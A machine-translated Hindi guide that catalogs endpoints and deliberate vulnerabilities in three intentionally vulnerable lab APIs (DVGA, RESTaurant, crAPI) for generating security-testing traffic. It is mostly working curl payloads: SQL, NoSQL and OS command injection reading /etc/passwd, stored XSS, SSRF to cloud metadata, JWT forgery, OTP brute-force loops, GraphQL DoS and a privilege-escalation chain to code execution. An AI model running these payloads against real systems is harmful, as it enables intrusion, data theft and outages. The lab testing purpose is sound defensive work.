---
title: API परीक्षण गाइड
description: >-
  DVGA, RESTaurant, और crAPI के लिए व्यापक एंडपॉइंट कैटलॉग, भेद्यता मैपिंग, और
  अटैक पेलोड — ट्रैफिक जनरेशन और F5 XC API सुरक्षा प्रोफाइल विकास के लिए
  ऑनबोर्डिंग संदर्भ
sidebar:
  order: 8
i18n:
  sourceHash: 884e2d1be2b7
  translator: machine
---

## अवलोकन

यह गाइड तीनों API सुरक्षा परीक्षण एप्लिकेशन में प्रत्येक API एंडपॉइंट, जानबूझकर रखी गई भेद्यता, और अटैक पेलोड को सूचीबद्ध करती है। इसका उपयोग F5 XC API सुरक्षा प्रोफाइल विकास के लिए ट्रैफिक जनरेशन पैटर्न बनाने में करें।

| एप्लिकेशन | प्रोटोकॉल | पथ | पोर्ट | प्रमाणीकरण | भेद्यताएँ |
|---|---|---|---|---|---|
| **DVGA** | GraphQL | `/dvga/` | 80 | कोई नहीं (admin: admin/password) | 25 परिदृश्य |
| **RESTaurant** | REST (FastAPI) | `/restaurant/` | 80 | JWT (form-encoded) | 7 OWASP API 2023 श्रेणियाँ |
| **crAPI** | REST (माइक्रोसर्विसेज) | `/` | 8888 | JWT (Bearer) | 18+ चैलेंज |

### एनवायरनमेंट वेरिएबल

```bash
ORIGIN="http://<ORIGIN_IP>"
CRAPI="http://<ORIGIN_IP>:8888"
```

---

## DVGA (Damn Vulnerable GraphQL Application)

**GraphQL एंडपॉइंट:** `POST ${ORIGIN}/dvga/graphql`
**GraphiQL IDE:** `GET ${ORIGIN}/dvga/`
**एडमिन क्रेडेंशियल:** admin / password

सभी DVGA इंटरैक्शन एक ही एंडपॉइंट (`/dvga/graphql`) का उपयोग करते हैं जिसमें JSON `{"query":"..."}` पेलोड के साथ POST अनुरोध भेजे जाते हैं।

### स्कीमा अवलोकन

```
Queries:  pastes, paste, me, systemHealth, systemUpdate, systemDiagnostics
Mutations: createPaste, importPaste, uploadPaste
Types:    PasteObject (id, title, content, public, owner, ipAddr, userAgent)
          OwnerObject (id, username, pastes)  ← circular reference
```

### एंडपॉइंट संदर्भ

| ऑपरेशन | प्रकार | प्रमाणीकरण | उद्देश्य |
|---|---|---|---|
| `pastes(public, filter, limit)` | Query | नहीं | पेस्ट सूची (filter के माध्यम से SQL इंजेक्शन) |
| `paste(id)` | Query | नहीं | एकल पेस्ट प्राप्त करें |
| `me(token)` | Query | नहीं | JWT द्वारा उपयोगकर्ता प्राप्त करें (जालसाजी के प्रति संवेदनशील) |
| `systemHealth` | Query | नहीं | हेल्थ चेक |
| `systemUpdate` | Query | नहीं | धीमी क्वेरी (~82s, DoS वेक्टर) |
| `systemDiagnostics(cmd)` | Query | admin/password | व्हाइटलिस्टेड OS कमांड निष्पादित करें |
| `createPaste(title, content, public)` | Mutation | नहीं | पेस्ट बनाएँ (content के माध्यम से XSS) |
| `importPaste(host, port, path, scheme)` | Mutation | नहीं | रिमोट पेस्ट आयात करें (SSRF, कमांड इंजेक्शन) |
| `uploadPaste(filename, content)` | Mutation | नहीं | पेस्ट अपलोड करें (पथ ट्रैवर्सल) |

### भेद्यता कैटलॉग

#### 1. सेवा अस्वीकार (DoS) (6 परिदृश्य)

**बैच क्वेरी अटैक:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"{systemUpdate}"},{"query":"{systemUpdate}"},{"query":"{systemUpdate}"}]'
```

**गहरी रिकर्सन (सर्कुलर Owner/Paste संदर्भ):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{owner{pastes{owner{pastes{owner{pastes{owner{pastes{title}}}}}}}}}}"}'
```

**संसाधन-गहन क्वेरी (~82 सेकंड प्रतिक्रिया):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemUpdate}"}'
```

**फील्ड डुप्लिकेशन (फील्ड को 500+ बार दोहराएँ):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{title title title title title title title title title title title title title title title title title title title title}}"}'
```

**एलियास-आधारित अटैक (1000 एलियास्ड ऑपरेशन):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{q0:systemUpdate q1:systemUpdate q2:systemUpdate q3:systemUpdate q4:systemUpdate q5:systemUpdate q6:systemUpdate q7:systemUpdate q8:systemUpdate q9:systemUpdate}"}'
```

#### 2. सूचना प्रकटीकरण (5 परिदृश्य)

**इंट्रोस्पेक्शन (पूर्ण स्कीमा गणना):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name fields{name args{name type{name}}}}}}"}'
```

**फील्ड सुझाव (टाइपो वैध फील्ड प्रकट करता है):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes{titl}}"}'
```

**importPaste के माध्यम से SSRF (आंतरिक सेवाओं की जाँच):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:57575,path:\"/\",scheme:\"http\"){result}}"}'
```

#### 3. इंजेक्शन (4 परिदृश्य)

**filter पैरामीटर के माध्यम से SQL इंजेक्शन:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{pastes(filter:\"aaa\\u0027 OR 1=1--\"){id title content public}}"}'
```

**createPaste के माध्यम से स्टोर्ड XSS:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{createPaste(title:\"<img src=x onerror=alert(1)>\",content:\"xss\",public:true){paste{id title}}}"}'
```

**लॉग इंजेक्शन (ऑपरेशन नाम स्पूफिंग):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation getPaste{createPaste(title:\"injected\",content:\"hidden mutation\",public:true){paste{id}}}"}'
```

#### 4. कोड निष्पादन (3 परिदृश्य)

**importPaste के माध्यम से OS कमांड इंजेक्शन:**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{importPaste(host:\"localhost\",port:80,path:\"/ ; uname -a\",scheme:\"http\"){result}}"}'
```

**systemDiagnostics के माध्यम से OS कमांड (एडमिन प्रमाणीकरण आवश्यक):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{systemDiagnostics(cmd:\"id\")}"}'
```

#### 5. प्राधिकरण बाईपास (3 परिदृश्य)

**JWT टोकन जालसाजी (अहस्ताक्षरित टोकन स्वीकार करता है):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{me(token:\"eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.\"){username}}"}'
```

**uploadPaste के माध्यम से मनमाना फाइल राइट (पथ ट्रैवर्सल):**
```bash
curl -X POST ${ORIGIN}/dvga/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"mutation{uploadPaste(filename:\"../../../tmp/test.txt\",content:\"path traversal test\"){result}}"}'
```

---

## RESTaurant API (Damn Vulnerable RESTaurant)

**Swagger UI:** `${ORIGIN}/restaurant/docs`
**OpenAPI Spec:** `${ORIGIN}/restaurant/openapi.json`
**प्रमाणीकरण:** `/restaurant/token` पर form-encoded POST के माध्यम से JWT
**भूमिकाएँ:** Customer (डिफ़ॉल्ट), Employee, Chef (एडमिन)

### सेटअप: पंजीकरण और प्रमाणीकरण

```bash
# एक परीक्षण उपयोगकर्ता पंजीकृत करें
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"Attack123","first_name":"Test","last_name":"User","phone_number":"5551234567"}'

# JWT टोकन प्राप्त करें (नोट: form-encoded, JSON नहीं)
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=attacker&password=Attack123" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

echo "Bearer token: ${TOKEN}"
```

### एंडपॉइंट संदर्भ

| एंडपॉइंट | मेथड | प्रमाणीकरण | भूमिका | भेद्यता |
|---|---|---|---|---|
| `/restaurant/register` | POST | नहीं | — | उपयोगकर्ता निर्माण |
| `/restaurant/token` | POST | नहीं | — | कमज़ोर सीक्रेट (97952) के साथ JWT |
| `/restaurant/healthcheck` | GET | नहीं | — | हेल्थ चेक |
| `/restaurant/profile` | GET | हाँ | कोई भी | उपयोगकर्ता प्रोफाइल |
| `/restaurant/profile` | PUT | हाँ | कोई भी | **BOLA** (अन्य उपयोगकर्ताओं को संशोधित करें) |
| `/restaurant/profile` | PATCH | हाँ | कोई भी | **BOPLA** (भूमिका का मास असाइन) |
| `/restaurant/users/update_role` | PUT | हाँ | कोई भी | **BFLA** (भूमिका वृद्धि) |
| `/restaurant/menu` | GET | हाँ | कोई भी | मेनू आइटम सूची |
| `/restaurant/menu` | PUT | हाँ | Employee+ | मेनू बनाएँ (इमेज के माध्यम से **SSRF**) |
| `/restaurant/menu/{item_id}` | PUT | हाँ | Employee+ | मेनू अपडेट करें (इमेज के माध्यम से **SSRF**) |
| `/restaurant/menu/{item_id}` | DELETE | हाँ | कोई भी | **BFLA** (कोई भी उपयोगकर्ता हटा सकता है) |
| `/restaurant/orders` | GET | हाँ | कोई भी | **BOLA** (सभी ऑर्डर देखें) |
| `/restaurant/orders` | POST | हाँ | कोई भी | ऑर्डर बनाएँ |
| `/restaurant/orders/{order_id}` | GET | हाँ | कोई भी | **BOLA** (अन्य ऑर्डर तक पहुँच) |
| `/restaurant/orders/status/{order_id}` | GET | हाँ | कोई भी | ऑर्डर स्थिति |
| `/restaurant/admin/stats/disk` | GET | हाँ | Chef | **कमांड इंजेक्शन** |
| `/restaurant/reset-password` | POST | नहीं | — | पासवर्ड रीसेट अनुरोध |
| `/restaurant/reset-password/new-password` | POST | नहीं | — | नया पासवर्ड सेट करें |
| `/restaurant/referral-code` | GET | हाँ | कोई भी | रेफरल कोड प्राप्त करें |
| `/restaurant/apply-referral` | POST | हाँ | कोई भी | रेफरल लागू करें |
| `/restaurant/discount-coupons` | GET | हाँ | कोई भी | कूपन सूची |

### भेद्यता कैटलॉग

#### API1:2023 — ब्रोकन ऑब्जेक्ट लेवल ऑथराइज़ेशन (BOLA)

**दूसरे उपयोगकर्ता की प्रोफाइल संशोधित करें:**
```bash
curl -X PUT ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","phone_number":"hacked","first_name":"Pwned","last_name":"User"}'
```

**अन्य उपयोगकर्ताओं के ऑर्डर तक पहुँचें (ऑफसेट गणना करें):**
```bash
for i in 1 2 3 4 5; do
  curl -sf ${ORIGIN}/restaurant/orders/${i} \
    -H "Authorization: Bearer ${TOKEN}" 2>&1
  echo ""
done
```

#### API2:2023 — ब्रोकन ऑथेंटिकेशन

**JWT कमज़ोर सीक्रेट ब्रूट-फ़ोर्स (सीक्रेट 6 अंक है: 97952):**
```bash
# jwt.io पर टोकन डिकोड और फोर्ज करें
# Secret: 97952 (hashcat -a 3 -m 16500 token '?d?d?d?d?d?d' से ब्रूट-फ़ोर्स करने योग्य)

# Chef टोकन फोर्ज करें:
# Header: {"alg":"HS256","typ":"JWT"}
# Payload: {"sub":"chef","exp":9999999999}
# सीक्रेट से साइन करें: 97952
```

#### API3:2023 — ब्रोकन ऑब्जेक्ट प्रॉपर्टी लेवल ऑथराइज़ेशन (BOPLA)

**Customer से Chef तक भूमिका का मास-असाइन:**
```bash
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

**वृद्धि पथ: Customer → Employee → Chef:**
```bash
# चरण 1: Employee तक वृद्धि
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Employee"}'

# चरण 2: Chef तक वृद्धि
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'
```

#### API5:2023 — ब्रोकन फंक्शन लेवल ऑथराइज़ेशन (BFLA)

**Customer के रूप में मेनू आइटम हटाएँ (Employee+ आवश्यक होना चाहिए):**
```bash
curl -X DELETE ${ORIGIN}/restaurant/menu/1 \
  -H "Authorization: Bearer ${TOKEN}"
```

**दूसरे उपयोगकर्ता की भूमिका बदलें:**
```bash
curl -X PUT ${ORIGIN}/restaurant/users/update_role \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"username":"chef","role":"Customer"}'
```

#### API7:2023 — सर्वर-साइड रिक्वेस्ट फोर्जरी (SSRF)

**मेनू image_url के माध्यम से आंतरिक एंडपॉइंट की जाँच करें (Employee भूमिका आवश्यक):**
```bash
# पहले BOPLA के माध्यम से Employee तक वृद्धि करें, फिर:
curl -X PUT ${ORIGIN}/restaurant/menu \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"SSRF Test","price":1.00,"category":"Test","image_url":"http://127.0.0.1:8091/admin/reset-chef-password"}'
```

#### API8:2023 — इंजेक्शन

**डिस्क स्टैट्स के माध्यम से OS कमांड इंजेक्शन (Chef भूमिका आवश्यक):**
```bash
# Chef तक वृद्धि के बाद:
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;whoami" \
  -H "Authorization: Bearer ${TOKEN}"

curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;cat%20/etc/passwd" \
  -H "Authorization: Bearer ${TOKEN}"
```

### पूर्ण अटैक चेन: Customer से Root तक

```bash
# 1. पंजीकरण
curl -X POST ${ORIGIN}/restaurant/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"Hack123","first_name":"H","last_name":"X","phone_number":"0"}'

# 2. टोकन प्राप्त करें
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 3. Chef तक वृद्धि (BOPLA)
curl -X PATCH ${ORIGIN}/restaurant/profile \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"role":"Chef"}'

# 4. Chef-स्तर का टोकन प्राप्त करने के लिए पुनः प्रमाणीकरण
TOKEN=$(curl -sf -X POST ${ORIGIN}/restaurant/token \
  -d "username=hacker&password=Hack123" | python3 -c "import sys,json;print(json.load(sys.stdin)['access_token'])")

# 5. कमांड इंजेक्शन (RCE)
curl -sf "${ORIGIN}/restaurant/admin/stats/disk?parameters=;id" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## crAPI (OWASP Completely Ridiculous API)

**वेब UI:** `${CRAPI}/`
**MailHog:** `${CRAPI}/mailhog/` (सत्यापन के लिए ईमेल कैप्चर)
**प्रमाणीकरण:** JWT Bearer टोकन (RS256, एल्गोरिदम कन्फ्यूज़न के प्रति संवेदनशील)
**आर्किटेक्चर:** 7 माइक्रोसर्विसेज (identity, community, workshop, postgres, mongo, mailhog, web)

### सेटअप: पंजीकरण, ईमेल सत्यापन, लॉगिन

```bash
# 1. पंजीकरण
curl -X POST ${CRAPI}/identity/api/auth/signup \
  -H "Content-Type: application/json" \
  -d '{"name":"Test User","email":"tester@example.com","number":"5551234567","password":"TestPass123"}'

# 2. सत्यापन ईमेल के लिए MailHog जाँचें
# ${CRAPI}/mailhog/ पर ब्राउज़ करें या MailHog API का उपयोग करें:
curl -sf ${CRAPI}/mailhog/api/v2/messages | python3 -c "
import sys,json
msgs = json.load(sys.stdin)['items']
for m in msgs:
    print(f\"To: {m['Raw']['To'][0]}, Subject: {m['Content']['Headers']['Subject'][0]}\")
"

# 3. लॉगिन करें और JWT टोकन प्राप्त करें
TOKEN=$(curl -sf -X POST ${CRAPI}/identity/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"tester@example.com","password":"TestPass123"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['token'])")

echo "Bearer token: ${TOKEN}"
```

### एंडपॉइंट संदर्भ

#### Identity सेवा

| एंडपॉइंट | मेथड | प्रमाणीकरण | भेद्यता |
|---|---|---|---|
| `/identity/api/auth/signup` | POST | नहीं | पंजीकरण |
| `/identity/api/auth/login` | POST | नहीं | JWT टोकन (एल्गोरिदम कन्फ्यूज़न) |
| `/identity/api/auth/forget-password` | POST | नहीं | OTP अनुरोध |
| `/identity/api/auth/v2/check-otp` | POST | नहीं | **कोई रेट लिमिट नहीं** (4-अंकीय OTP ब्रूट-फ़ोर्स) |
| `/identity/api/auth/v3/check-otp` | POST | नहीं | रेट-लिमिटेड संस्करण |
| `/identity/api/v2/user/dashboard` | GET | हाँ | उपयोगकर्ता प्रोफाइल |
| `/identity/api/v2/user/change-email` | PUT | हाँ | ईमेल बदलें |
| `/identity/api/v2/vehicle/vehicles` | GET | हाँ | वाहन सूची (UUID लीक करता है) |
| `/identity/api/v2/vehicle/{uuid}/location` | GET | हाँ | **BOLA** (किसी भी उपयोगकर्ता का वाहन) |
| `/identity/api/v2/user/videos` | POST | हाँ | वीडियो अपलोड |
| `/identity/api/v2/user/videos/{id}` | GET | हाँ | **डेटा एक्सपोज़र** (conversion_params) |
| `/identity/api/v2/user/videos/{id}` | PUT | हाँ | **मास असाइनमेंट** (कमांड इंजेक्शन) |
| `/identity/api/v2/admin/videos/{id}` | DELETE | हाँ | **BFLA** (कोई एडमिन जाँच नहीं) |

#### Community सेवा

| एंडपॉइंट | मेथड | प्रमाणीकरण | भेद्यता |
|---|---|---|---|
| `/community/api/v2/community/posts` | GET | हाँ | **डेटा एक्सपोज़र** (vehicle_id, email लीक करता है) |
| `/community/api/v2/community/posts` | POST | हाँ | ब्लॉग पोस्ट बनाएँ |
| `/community/api/v2/community/posts/{id}/comments` | POST | हाँ | टिप्पणी जोड़ें |
| `/community/api/v2/coupon/validate-coupon` | POST | हाँ | **NoSQL इंजेक्शन** |

#### Workshop सेवा

| एंडपॉइंट | मेथड | प्रमाणीकरण | भेद्यता |
|---|---|---|---|
| `/workshop/api/mechanic` | GET | हाँ | **डेटा एक्सपोज़र** (मैकेनिक ईमेल) |
| `/workshop/api/mechanic/mechanic_report` | GET | नहीं | **BOLA** (कोई प्रमाणीकरण नहीं, अनुक्रमिक ID) |
| `/workshop/api/merchant/contact_mechanic` | POST | हाँ | **SSRF** + **DoS** |
| `/workshop/api/shop/products` | GET | हाँ | उत्पाद कैटलॉग |
| `/workshop/api/shop/orders/` | POST | हाँ | ऑर्डर बनाएँ |
| `/workshop/api/shop/orders/all` | GET | हाँ | ऑर्डर सूची |
| `/workshop/api/shop/orders/{id}` | GET | नहीं | **BOLA** (कोई प्रमाणीकरण आवश्यक नहीं) |
| `/workshop/api/shop/orders/{id}` | PUT | हाँ | **मास असाइनमेंट** (status, quantity) |
| `/workshop/api/shop/apply_coupon` | POST | हाँ | **SQL इंजेक्शन** |

### चैलेंज कैटलॉग

#### चैलेंज 1 — BOLA: दूसरे उपयोगकर्ता के वाहन की लोकेशन तक पहुँच

```bash
# पहले अपना वाहन UUID प्राप्त करें
curl -sf ${CRAPI}/identity/api/v2/vehicle/vehicles \
  -H "Authorization: Bearer ${TOKEN}"

# दूसरे उपयोगकर्ता के वाहन तक पहुँचें (UUID बदलें)
curl -sf ${CRAPI}/identity/api/v2/vehicle/VICTIM-UUID-HERE/location \
  -H "Authorization: Bearer ${TOKEN}"
```

#### चैलेंज 2 — BOLA: मैकेनिक रिपोर्ट तक पहुँच (बिना प्रमाणीकरण)

```bash
# अनुक्रमिक ID गणना — कोई टोकन आवश्यक नहीं
for i in 1 2 3 4 5; do
  echo "Report $i:"
  curl -sf "${CRAPI}/workshop/api/mechanic/mechanic_report?report_id=${i}"
  echo ""
done
```

#### चैलेंज 3 — ब्रोकन ऑथ: पासवर्ड रीसेट OTP ब्रूट-फ़ोर्स

```bash
# पीड़ित के लिए OTP अनुरोध करें
curl -X POST ${CRAPI}/identity/api/auth/forget-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com"}'

# 4-अंकीय OTP ब्रूट-फ़ोर्स (v2 में कोई रेट लिमिटिंग नहीं)
for otp in $(seq -w 0000 9999); do
  RESULT=$(curl -sf -X POST ${CRAPI}/identity/api/auth/v2/check-otp \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"victim@example.com\",\"otp\":\"${otp}\"}" 2>&1)
  echo "$otp: $RESULT" | grep -v "Invalid OTP" && break
done
```

#### चैलेंज 4 — डेटा एक्सपोज़र: मैकेनिक ईमेल लीक

```bash
curl -sf ${CRAPI}/workshop/api/mechanic \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
```

#### चैलेंज 5 — डेटा एक्सपोज़र: आंतरिक वीडियो कन्वर्शन पैरामीटर

```bash
# एक वीडियो अपलोड करें, फिर प्रतिक्रिया की जाँच करें
curl -sf ${CRAPI}/identity/api/v2/user/videos \
  -H "Authorization: Bearer ${TOKEN}" | python3 -m json.tool
# प्रतिक्रिया में conversion_params फील्ड देखें
```

#### चैलेंज 6 — DoS: कॉन्टैक्ट मैकेनिक के माध्यम से लेयर 7

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"Engine issue",
    "vin":"VEHICLE_VIN",
    "mechanic_api":"http://localhost:8080/api",
    "repeat_request_if_failed":true,
    "number_of_repeats":100
  }'
```

#### चैलेंज 7 — BFLA: एडमिन एंडपॉइंट के माध्यम से वीडियो हटाएँ

```bash
# सामान्य उपयोगकर्ता एडमिन एंडपॉइंट तक पहुँच सकता है
curl -X DELETE ${CRAPI}/identity/api/v2/admin/videos/VIDEO_ID_HERE \
  -H "Authorization: Bearer ${TOKEN}"
```

#### चैलेंज 8 और 9 — मास असाइनमेंट: ऑर्डर मैनिपुलेशन के माध्यम से मुफ्त आइटम

```bash
# GET को PUT में बदलें, status और quantity संशोधित करें
curl -X PUT ${CRAPI}/workshop/api/shop/orders/1 \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"status":"returned","quantity":100}'
```

#### चैलेंज 10 — वीडियो कन्वर्शन पैरामीटर के माध्यम से कमांड इंजेक्शन

```bash
curl -X PUT ${CRAPI}/identity/api/v2/user/videos/VIDEO_ID \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"conversion_params":"-v codec h264; cat /etc/passwd"}'
```

#### चैलेंज 11 — कॉन्टैक्ट मैकेनिक के माध्यम से SSRF

```bash
curl -X POST ${CRAPI}/workshop/api/merchant/contact_mechanic \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "mechanic_code":"MECH001",
    "problem_details":"test",
    "vin":"VIN123",
    "mechanic_api":"http://169.254.169.254/latest/meta-data/",
    "repeat_request_if_failed":false,
    "number_of_repeats":0
  }'
```

#### चैलेंज 12 — NoSQL इंजेक्शन: कूपन कोड निकालें

```bash
curl -X POST ${CRAPI}/community/api/v2/coupon/validate-coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"coupon_code":{"$ne":1}}'
```

#### चैलेंज 13 — SQL इंजेक्शन: कूपन को कई बार रिडीम करें

```bash
curl -X POST ${CRAPI}/workshop/api/shop/apply_coupon \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d "{\"coupon_code\":\"TRAC075' OR '1'='1\"}"
```

#### चैलेंज 14 — बिना प्रमाणीकरण ऑर्डर तक पहुँच

```bash
# कोई Authorization हेडर नहीं — फिर भी डेटा लौटाता है
for i in 1 2 3 4 5; do
  curl -sf ${CRAPI}/workshop/api/shop/orders/${i}
  echo ""
done
```

#### चैलेंज 15 — JWT एल्गोरिदम कन्फ्यूज़न

```bash
# "none" एल्गोरिदम के साथ JWT फोर्ज करें (कोई हस्ताक्षर सत्यापन नहीं):
# 1. हेडर सेट करें: {"alg":"none","typ":"JWT"} और base64url-एन्कोड करें
# 2. पेलोड सेट करें: {"email":"admin@example.com","role":"admin"} और base64url-एन्कोड करें
# 3. डॉट्स से जोड़ें, हस्ताक्षर खाली छोड़ें: <header>.<payload>.
HEADER=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
PAYLOAD=$(echo -n '{"email":"admin@example.com","role":"admin"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
FORGED="${HEADER}.${PAYLOAD}."

curl -sf ${CRAPI}/identity/api/v2/user/dashboard \
  -H "Authorization: Bearer ${FORGED}"
```

---

## OWASP API सुरक्षा शीर्ष 10 क्रॉस-रेफरेंस

| OWASP श्रेणी | DVGA | RESTaurant | crAPI |
|---|---|---|---|
| **API1: BOLA** | — | `PUT /profile`, `GET /orders/{id}` | वाहन लोकेशन, मैकेनिक रिपोर्ट, ऑर्डर |
| **API2: ब्रोकन ऑथ** | JWT जालसाजी (`me` क्वेरी) | JWT कमज़ोर सीक्रेट (97952) | OTP ब्रूट-फ़ोर्स (v2), JWT एल्गोरिदम कन्फ्यूज़न |
| **API3: BOPLA** | — | `PATCH /profile` (भूमिका वृद्धि) | वीडियो conversion_params, मैकेनिक ईमेल एक्सपोज़र |
| **API4: संसाधन खपत** | बैच, रिकर्सन, एलियास, फील्ड डुप्लिकेशन DoS | प्रतिक्रिया लंबाई के माध्यम से उपयोगकर्ता गणना | `contact_mechanic` repeat_request DoS |
| **API5: BFLA** | — | `DELETE /menu`, `PUT /users/update_role` | सामान्य उपयोगकर्ता के रूप में `DELETE /admin/videos` |
| **API6: मास असाइनमेंट** | — | `PUT /orders` (status, quantity) | ऑर्डर status/quantity, वीडियो conversion_params |
| **API7: SSRF** | `importPaste` म्यूटेशन | `PUT /menu` image_url | `contact_mechanic` mechanic_api URL |
| **API8: इंजेक्शन** | SQL (`filter`), XSS (`content`), OS cmd (`importPaste`, `systemDiagnostics`) | OS cmd (`/admin/stats/disk?parameters=`) | NoSQL (`validate-coupon`), SQL (`apply_coupon`) |
| **API9: अनुचित एसेट्स** | — | — | पुराना `/auth/v2/check-otp` (कोई रेट लिमिट नहीं) |
| **API10: असुरक्षित उपभोग** | — | — | (SSRF के माध्यम से अप्रत्यक्ष) |
| **GraphQL-विशिष्ट** | इंट्रोस्पेक्शन, बैचिंग, रिकर्सन, एलियासेज, फील्ड डुप्लिकेशन, सर्कुलर फ्रैगमेंट | — | — |

---

## ट्रैफिक जनरेशन पैटर्न

### चरण 1: बेसलाइन (हैपी पाथ)

अटैक पैटर्न परीक्षण से पहले सामान्य API व्यवहार स्थापित करने के लिए वैध ट्रैफिक उत्पन्न करें।

**DVGA बेसलाइन:**
```bash
# सामान्य क्वेरी
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"{pastes{id title}}"}'
curl -X POST ${ORIGIN}/dvga/graphql -H "Content-Type: application/json" -d '{"query":"mutation{createPaste(title:\"note\",content:\"hello\",public:true){paste{id}}}"}'
```

**RESTaurant बेसलाइन:**
```bash
curl -sf ${ORIGIN}/restaurant/menu -H "Authorization: Bearer ${TOKEN}"
curl -sf ${ORIGIN}/restaurant/profile -H "Authorization: Bearer ${TOKEN}"
curl -X POST ${ORIGIN}/restaurant/orders -H "Authorization: Bearer ${TOKEN}" -H "Content-Type: application/json" -d '{"menu_item_id":1,"quantity":1}'
```

**crAPI बेसलाइन:**
```bash
curl -sf ${CRAPI}/identity/api/v2/user/dashboard -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/workshop/api/shop/products -H "Authorization: Bearer ${TOKEN}"
curl -sf ${CRAPI}/community/api/v2/community/posts -H "Authorization: Bearer ${TOKEN}"
```

### चरण 2: OWASP श्रेणी के अनुसार अटैक ट्रैफिक

**BOLA परीक्षण:** अनुक्रमिक ID की गणना करें, अनुरोधों में उपयोगकर्ता पहचानकर्ता बदलें, स्वामित्व के बिना संसाधनों तक पहुँचें।

**इंजेक्शन परीक्षण:** filter/coupon पैरामीटर में SQL पेलोड, GraphQL क्वेरी इंजेक्शन, पैरामीटर फील्ड के माध्यम से OS कमांड इंजेक्शन।

**ऑथ बाईपास परीक्षण:** JWT टोकन फोर्ज करें, OTP ब्रूट-फ़ोर्स करें, पुराने API संस्करणों का उपयोग करें, एल्गोरिदम कन्फ्यूज़न।

**SSRF परीक्षण:** `importPaste`, `image_url`, और `mechanic_api` पैरामीटर में आंतरिक URL।

**DoS परीक्षण:** GraphQL बैच/रिकर्सन/एलियास अटैक, उच्च गणना के साथ `repeat_request_if_failed`।

### चरण 3: स्टेटफुल अटैक चेन

कुछ अटैक के लिए स्थिति सहित बहु-चरणीय अनुक्रम की आवश्यकता होती है:

1. **RESTaurant एस्कलेशन चेन:** पंजीकरण → टोकन → PATCH भूमिका को Chef तक → पुनः प्रमाणीकरण → कमांड इंजेक्शन
2. **crAPI पूर्ण प्रवाह:** साइनअप → ईमेल सत्यापन (MailHog) → लॉगिन → वाहन जोड़ें → कॉन्टैक्ट मैकेनिक (SSRF) → ऑर्डर मैनिपुलेशन
